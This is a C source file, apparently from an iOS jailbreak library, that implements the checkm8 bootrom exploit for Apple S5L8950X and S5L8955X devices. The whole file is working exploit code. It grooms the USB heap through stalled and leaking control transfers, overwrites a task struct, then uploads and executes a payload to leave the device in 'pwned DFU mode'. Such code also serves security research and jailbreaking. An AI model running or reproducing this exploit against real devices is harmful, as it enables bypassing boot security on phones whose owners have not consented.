#include <libbelladonna.h>
#include <payload_gen.c>

#define S5l8950X_OVERWRITE (unsigned char*)"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00"
#define S5l8955X_OVERWRITE S5l8950X_OVERWRITE

static int usb_stall(libloader_device_t dev){
	int ret;
	unsigned char buf[0xC0];
	memset(buf, 'A', 0xC0);
	ret = libloader_async_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 0.00001);
	if(ret < 0) {
		return -1;
	}
	return 0;
}


static int usb_leak(libloader_device_t dev){
	int ret;
	unsigned char buf[0xC0];
	ret = libloader_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC0, 1);
	if(ret < 0) {
		return -1;
	}
	return 0;
}

static int usb_no_leak(libloader_device_t dev){
	int ret;
	unsigned char buf[0xC1];
	ret = libloader_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0xC1, 1);
	if(ret < 0) {
		return -1;
	}
	return 0;
}
static int usb_req_stall(libloader_device_t dev){
	int ret;
	ret = libloader_ctrl_transfer(dev, 0x2, 3, 0x0, 0x80, NULL, 0, 10);
	if(ret != LIBLOADER_ERROR_PIPE) {
		return -1;
	}
	return 0;
}

static int usb_req_leak(libloader_device_t dev){
	int ret;
	unsigned char buf[0x40];
	ret = libloader_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0x40, 1);
	if(ret != LIBUSB_ERROR_TIMEOUT) {
		return -1;
	}
	return 0;
}

static int usb_req_no_leak(libloader_device_t dev){
	int ret;
	unsigned char buf[0x41];
	ret = libloader_ctrl_transfer(dev, 0x80, 6, 0x304, 0x40A, buf, 0x41, 1);
	if(ret != LIBUSB_ERROR_TIMEOUT) {
		return -1;
	}
	return 0;
}

int checkm8_supported(libloader_device_t dev) {
	uint16_t cpid = libloader_get_cpid(dev);
	switch(cpid) {
		case 0x8950:
			return 0;
		case 0x8955:
			return 0;
		default:
			return -1;
	}
}

static int get_exploit_configuration(uint16_t cpid, uint16_t* large_leak, uint16_t* hole, uint16_t* overwrite_offset, uint16_t* leak, unsigned char** overwrite, size_t* overwrite_len) {
	switch(cpid) {
		case 0x8950:
			*large_leak = 659;
			*hole = 0;
			*overwrite_offset = 0x640;
			*leak = 0;
			*overwrite = S5l8950X_OVERWRITE;
			*overwrite_len = 28;
			return 0;
		case 0x8955:
			*large_leak = 659;
			*hole = 0;
			*overwrite_offset = 0x640;
			*leak = 0;
			*overwrite = S5l8955X_OVERWRITE;
			*overwrite_len = 28;
			return 0;
		default:
			error("No exploit configuration is available for your device.");
			return -1;
	}
}

libloader_device_t checkm8_exploit(libloader_device_t dev) {
	LOG("checkm8 by axi0mX\n");
	int ret;
	unsigned char buf[0x800];
	memset(buf, 'A', 0x800);
	uint16_t large_leak;
	uint16_t hole;
	uint16_t overwrite_offset;
	uint16_t leak;
	unsigned char* overwrite;
	size_t overwrite_len;
	unsigned char* payload;
	size_t payload_len;
	uint16_t cpid = libloader_get_cpid(dev);
	ret = get_exploit_configuration(cpid, &large_leak, &hole, &overwrite_offset, &leak, &overwrite, &overwrite_len);
	if(ret != 0) {
		error("Failed to get exploit configuration.");
		libloader_close(dev);
		return NULL;
	}

	char* identifier = libloader_get_identifier(dev);
	if(!identifier) {
		error("Failed to get identifier.");
		libloader_close(dev);
		return NULL;
	}

	ret = get_payload_configuration(cpid, identifier, &payload, &payload_len);
	if(ret != 0) {
		error("Failed to get payload configuration.");
		libloader_close(dev);
		return NULL;
	}
	dev = libloader_reconnect(dev, 0.5);
	if(!dev) {
		error("Failed to reconnect to device.");
		return NULL;
	}

	LOG("Grooming heap\n");
	if(large_leak) {
		ret = usb_req_stall(dev);
		if(ret != 0) {
			error("Failed to stall pipe.");
			libloader_close(dev);
			return NULL;
		}
		for(int i = 0; i < large_leak; i++) {
			ret = usb_req_leak(dev);
			if(ret != 0) {
				error("Failed on leak: %d.", i);
				libloader_close(dev);
				return NULL;
			}
		}
		ret = usb_req_no_leak(dev);
			if(ret != 0) {
				error("Failed on unstall pipe.");
				libloader_close(dev);
				return NULL;
			}
	}
	else {
		usb_stall(dev);
		for(int i = 0; i < hole; i++) {
			usb_no_leak(dev);
		}
		usb_leak(dev);
		usb_no_leak(dev);
	}
	libloader_reset(dev);
	dev = libloader_reconnect(dev, 0.5);
	if(!dev) {
		error("Failed to reconnect to device.");
		return NULL;
	}

	LOG("Preparing for overwrite\n");
	ret = libloader_async_ctrl_transfer(dev, 0x21, 1, 0, 0, buf, 0x800, 0.0001);
	if(ret != 0) {
		error("Failed to prepare for overwrite.");
		libloader_close(dev);
		return NULL;
	}
	libloader_ctrl_transfer(dev, 0, 0, 0, 0, buf, overwrite_offset, 100);
	libloader_ctrl_transfer(dev, 0x21, 4, 0, 0, 0, 0, 0);
	dev = libloader_reconnect(dev, 0.5);
	if(!dev) {
		error("Failed to reconnect to device.");
		return NULL;
	}

	LOG("Overwriting task struct\n");
	usb_req_stall(dev);
	if(large_leak) {
		usb_req_leak(dev);
	}
	else {
		for(int i = 0; i < leak; i++) {
			usb_req_leak(dev);
		}
	}
	libloader_ctrl_transfer(dev, 0, 0, 0, 0, overwrite, 28, 100);

	LOG("Uploading payload\n");
	libloader_ctrl_transfer(dev, 0x21, 1, 0, 0, payload, payload_len, 100);
	free(payload);

	LOG("Executing payload\n");
	libloader_reset(dev);
	dev = libloader_reconnect(dev, 2);
	if(!dev) {
		error("Failed execute payload.");
		return NULL;
	}
	ret = libloader_is_pwned_dfu(dev);
	if(!ret) {
		error("Device not in Pwned DFU mode.");
		libloader_close(dev);
		return NULL;
	}
	LOG("Device is now in pwned DFU mode\n");
	return dev;
}